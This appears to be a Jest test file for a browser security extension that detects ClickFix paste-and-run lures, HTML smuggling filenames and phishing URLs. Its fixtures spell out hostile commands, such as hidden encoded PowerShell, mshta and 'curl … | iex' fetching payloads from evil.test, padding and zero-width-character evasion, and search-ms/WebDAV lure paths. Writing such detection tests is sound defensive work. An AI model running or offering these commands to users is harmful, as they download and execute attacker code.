import { clickFixTier, looksLikeClickFixCommand, looksLikeHtmlSmugglingName, pasteLureContext, warnUnseenWeakCommand, weakCommandIsShown } from "@engine/page/clickfix";
import { analyzeUrl } from "@engine/analyze";
import { presentAnalysis } from "@engine/status/present";
import { looksDangerousDownload } from "../../src/background/downloads";
import { signalsForPageChecks } from "@engine/page/merge";
import { WEIGHTS } from "@engine/risk/weights";
import type { AnalysisInput } from "@shared/types";

const base: AnalysisInput = {
  url: "https://example.com/",
  blocklist: [],
  allowlist: [],
  phishingProtection: true,
  threatProtection: true,
  securityLevel: "standard",
};

describe("ClickFix command detector", () => {
  it("flags encoded PowerShell and mshta lures", () => {
    expect(
      looksLikeClickFixCommand("powershell -nop -w hidden -enc SQBFAFgA"),
    ).toBe(true);
    expect(looksLikeClickFixCommand("mshta https://evil.test/payload.hta")).toBe(true);
    expect(looksLikeClickFixCommand("curl https://evil.test/x.ps1 | iex")).toBe(true);
  });

  it("still flags a command buried in padding", () => {
    const cmd = "powershell -w hidden -c iex(irm http://evil.test/p)";
    expect(clickFixTier(`${" ".repeat(12_000)}${cmd}`)).toBe("strong");
    expect(clickFixTier(`${" ".repeat(100_000)}${cmd}`)).toBe("strong");
    expect(clickFixTier(`${cmd} #${"a".repeat(100_000)}`)).toBe("strong");
    expect(clickFixTier(`${"a".repeat(20_000)}\n${cmd}`)).toBe("strong");
    expect(clickFixTier(`${"\u00A0".repeat(4000)}${"\u2000".repeat(50)}${"\u3000".repeat(50)}${cmd}`)).toBe("strong");
    expect(clickFixTier(`power\u200Bshell -w hidden -c iex(irm http://evil.test/p)`)).toBe("strong");
    expect(clickFixTier(`${"a".repeat(20_000)}${cmd}${"a".repeat(20_000)}`)).toBe("strong");
    expect(clickFixTier("a".repeat(20_000))).toBeNull();
    expect(clickFixTier("curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh")).toBe("weak");
    expect(clickFixTier(`${"a".repeat(20_000)}\ncurl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh`)).toBe("weak");
  });

  it("treats finger, a renamed ct.exe, and a file lure as strong", () => {
    expect(clickFixTier("finger admin@10.0.0.5")).toBe("strong");
    expect(clickFixTier("cmd /c start finger.exe")).toBe("strong");
    expect(clickFixTier("cmd.exe /c start ct.exe")).toBe("strong");
    expect(clickFixTier("C:\\Users\\Public\\ChromeUpdate.search-ms")).toBe("strong");
    expect(clickFixTier("\\\\files\\share\\invoice.lnk")).toBe("strong");
    expect(clickFixTier("update.hta")).toBe("strong");
    expect(clickFixTier("the finger utility prints who is logged in")).toBeNull();
    expect(clickFixTier("ubuntu-24.04.iso")).toBeNull();
  });

  it("flags a search URI, a WebDAV path, and an Explorer address-bar payload", () => {
    expect(clickFixTier("search-ms:query=invoice&crumb=location:\\\\files.example@SSL\\DavWWWRoot\\share&displayname=Downloads")).toBe("strong");
    expect(clickFixTier("search:query=invoice&crumb=location:\\\\files.example@80\\share")).toBe("strong");
    expect(clickFixTier("ms-search:query=invoice&crumb=location:\\\\files.example\\share")).toBe("strong");
    expect(clickFixTier("ms-msdt:id PCWDiagnostic")).toBe("strong");
    expect(clickFixTier("ms-settings:windowsdefender")).toBe("strong");
    expect(clickFixTier("\\\\files.example@SSL\\DavWWWRoot\\invoice")).toBe("strong");
    expect(clickFixTier("\\\\files.example@80\\share\\invoice")).toBe("strong");
    expect(clickFixTier("\\\\files.example@443\\share\\invoice")).toBe("strong");
    expect(clickFixTier(`C:\\Users\\Public\\Documents\\invoice.pdf${" ".repeat(40)}powershell -c "irm http://evil.test/a|iex"`)).toBe("strong");
    expect(clickFixTier('C:\\Users\\Public\\Documents\\invoice.pdf # powershell -c "irm http://evil.test/a|iex"')).toBe("strong");
    expect(clickFixTier(`${"powershell -c \"irm http://evil.test/a|iex\""}${" ".repeat(40)}C:\\Users\\Public\\Documents\\invoice.pdf`)).toBe("strong");
    expect(clickFixTier("\\\\fileserver\\share\\readme.txt")).toBeNull();
    expect(clickFixTier("C:\\Users\\Public\\Documents\\invoice.pdf")).toBeNull();
    expect(clickFixTier("C:\\Users\\Public\\Documents\\invoice.pdf powershell Get-Process")).toBeNull();
    expect(clickFixTier("search: see the manual")).toBeNull();
    expect(clickFixTier("Open Settings from the Start menu")).toBeNull();
  });

  it("does not treat install docs as a paste lure", () => {
    const docs = [
      "Install Homebrew. Open Terminal and run /bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"",
      "winget install --id Git.Git -e",
      "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh",
      "curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash",
      "curl -fsSL https://get.docker.com -o get-docker.sh",
      "npm install -g typescript",
      "pip install requests",
    ];
    for (const line of docs) {
      expect(pasteLureContext(`Open Terminal and paste this into PowerShell.\n${line}`), line).toBe(false);
      expect(looksLikeClickFixCommand(line, false), line).toBe(false);
    }
    expect(clickFixTier("winget install --id Git.Git -e")).toBeNull();
    expect(clickFixTier("npm install -g typescript")).toBeNull();
    expect(clickFixTier("pip install requests")).toBeNull();
    expect(pasteLureContext("This site is protected by reCAPTCHA and the Google Privacy Policy and Terms of Service apply.")).toBe(false);
    expect(pasteLureContext("Your browser is out of date. Please update your browser.")).toBe(false);
    expect(pasteLureContext("I'm not a robot")).toBe(false);
    expect(pasteLureContext("Aw, Snap! Chrome has crashed. Your browser is out of date.")).toBe(false);
    expect(pasteLureContext("Chrome ist abgestürzt. Der Browser ist veraltet.")).toBe(false);
    expect(pasteLureContext("Your browser is out of date. Paste the fix.")).toBe(true);
    expect(pasteLureContext("Chrome ist abgestürzt. Füge den Befehl ein.")).toBe(true);
    expect(pasteLureContext("Press Windows + R, then Ctrl + V.")).toBe(true);
    expect(looksLikeClickFixCommand("curl -fsSL https://evil.test/fix.sh | sh", true)).toBe(true);
    const buried = `${"Install docs. ".repeat(2000)}Press Windows + R.`;
    expect(pasteLureContext(buried)).toBe(true);
    expect(pasteLureContext(`${"Install docs. ".repeat(2000)}Chrome has crashed.`)).toBe(false);
  });

  it("warns on an unseen weak command only for a user site on a hosting zone", () => {
    expect(warnUnseenWeakCommand({ popular: true, userHosted: false })).toBe(false);
    expect(warnUnseenWeakCommand({ popular: true, userHosted: true })).toBe(false);
    expect(warnUnseenWeakCommand({ popular: false, userHosted: false })).toBe(false);
    expect(warnUnseenWeakCommand({ popular: false, userHosted: true })).toBe(true);
    expect(warnUnseenWeakCommand({ popular: false, userHosted: true, commandShown: true })).toBe(false);
    expect(weakCommandIsShown("curl -fsSL https://example.test/install.sh | sh", "Install the CLI\ncurl -fsSL https://example.test/install.sh | sh")).toBe(true);
    expect(weakCommandIsShown("curl -fsSL https://example.test/install.sh | sh", "Follow the picture Fix Chrome")).toBe(false);
  });

  it("does not flag ordinary documentation snippets", () => {
    expect(looksLikeClickFixCommand("powershell Get-Process")).toBe(false);
    expect(looksLikeClickFixCommand("copy this password: hunter2hunter2")).toBe(false);
  });
});

describe("ClickFix and kit URLs", () => {
  it("flags a fake CAPTCHA on a cheap TLD", async () => {
    const analysis = await analyzeUrl({
      ...base,
      url: "https://verify-human.xyz/captcha",
    });
    expect(analysis.signals.some((s) => s.id === "clickfix-url")).toBe(true);
    expect(presentAnalysis(analysis, true).tone).not.toBe("safe");
  });

  it("does not flag Cloudflare’s own site as ClickFix", async () => {
    const analysis = await analyzeUrl({
      ...base,
      url: "https://www.cloudflare.com/learning/bots/what-is-a-captcha/",
    });
    expect(analysis.signals.some((s) => s.id === "clickfix-url")).toBe(false);
    expect(analysis.signals.some((s) => s.id === "impersonation" && s.severity === "warn")).toBe(false);
  });

  it("flags an OAuth consent proxy", async () => {
    const analysis = await analyzeUrl({
      ...base,
      url: "https://grant-access.xyz/oauth?client_id=abc&redirect_uri=https://accounts.google.com/o/oauth2",
    });
    expect(analysis.signals.some((s) => s.id === "oauth-proxy")).toBe(true);
  });
});

describe("HTML smuggling names", () => {
  it("treats Windows Search / shortcut payloads as hostile even on HTTPS", () => {
    expect(looksLikeHtmlSmugglingName("invoice.search-ms")).toBe(true);
    expect(looksLikeHtmlSmugglingName("report.pdf.html")).toBe(true);
    expect(looksLikeHtmlSmugglingName("ubuntu-24.04.iso")).toBe(false);
    expect(looksDangerousDownload("https://evil.test/invoice.pdf.html")).toBe(true);
    expect(looksDangerousDownload("blob:https://evil.test/uuid", [], "setup.search-ms")).toBe(true);
    expect(looksDangerousDownload("https://example.com/report.pdf")).toBe(false);
  });
});

describe("page signals for new kits", () => {
  it("weights clipboard ClickFix above a typical overlay", () => {
    const signals = signalsForPageChecks(["clickfix-clipboard"]);
    expect(signals[0]?.weightApplied).toBe(WEIGHTS.clickFixClipboard);
    expect(WEIGHTS.clickFixClipboard).toBeGreaterThan(WEIGHTS.overlayClickjack);
  });
});
